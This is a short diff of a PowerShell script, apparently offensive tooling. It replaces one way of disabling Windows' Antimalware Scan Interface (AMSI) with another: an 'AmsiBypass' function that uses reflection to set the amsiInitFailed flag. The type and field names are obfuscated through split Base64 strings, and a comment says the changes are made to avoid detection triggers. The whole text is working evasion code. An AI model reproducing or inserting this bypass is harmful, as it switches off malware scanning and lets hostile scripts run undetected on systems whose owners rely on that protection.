@@ -1,1 +1,5 @@
-﻿$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
+﻿function AmsiBypass
+{
+    #This is Matt Graebers Reflection method bypass with changes to triggers 
+    (([Ref].Assembly.gettypes() | ? {$_.Name -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBAsE64String('QQBt'+'AHMAaQA'+'qAHQAaQB'+'sAHMA')))}).GetFields($([Text.Encoding]::Unicode.GetString([Convert]::FromBAsE64String('T'+'gB'+'vAG4AUAB1AGIAb'+'ABpAGMALABTAHQAYQB0A'+'GkAYwA=')))) | ? {$_.Name -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBAsE64String('Y'+'QBtAHMA'+'aQBJAG4Aa'+'QB0ACoAYQB'+'pAGwAZQ'+'BkAA==')))}).SetValue($null,$true)
+}
